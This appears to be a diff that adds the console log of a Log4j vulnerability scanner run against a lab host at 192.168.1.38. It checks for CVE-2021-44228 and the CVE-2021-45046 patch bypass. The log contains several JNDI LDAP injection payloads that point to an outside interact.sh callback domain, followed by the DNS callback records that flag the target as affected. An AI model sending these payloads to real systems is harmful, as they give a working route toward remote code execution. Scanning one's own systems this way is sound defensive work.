@@ -1,0 +1,15 @@
+[•] CVE-2021-44228 - Apache Log4j RCE Scanner
+[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+[•] Secure your External Attack Surface with FullHunt.io.
+[•] Initiating DNS callback server (interact.sh).
+[%] Checking for Log4j RCE CVE-2021-44228.
+[•] URL: http://192.168.1.38:8080/
+[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:ldap://127.0.0.1#192.168.1.38.ifi4vw2cl6204i37ft472839658x5758s.interact.sh:1389/cs55nsl}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:ldap://127.0.0.1#192.168.1.38.ifi4vw2cl6204i37ft472839658x5758s.interact.sh/cs55nsl}
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:ldap://127.1.1.1#192.168.1.38.ifi4vw2cl6204i37ft472839658x5758s.interact.sh/cs55nsl}
+[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+[•] Waiting...
+[!!!] Targets Affected
+{"timestamp": "2022-03-12T11:23:32.803939185Z", "host": "127.0.0.1#192.168.1.38.ifi4vw2cl6204i37ft472839658x5758s.ifi4vw2cl6204i37ft472839658x5758s.interact.sh", "remote_address": "80.58.184.5"}
+{"timestamp": "2022-03-12T11:23:33.685416025Z", "host": "127.1.1.1#192.168.1.38.ifi4vw2cl6204i37ft472839658x5758s.ifi4vw2cl6204i37ft472839658x5758s.interact.sh", "remote_address": "80.58.184.18"}
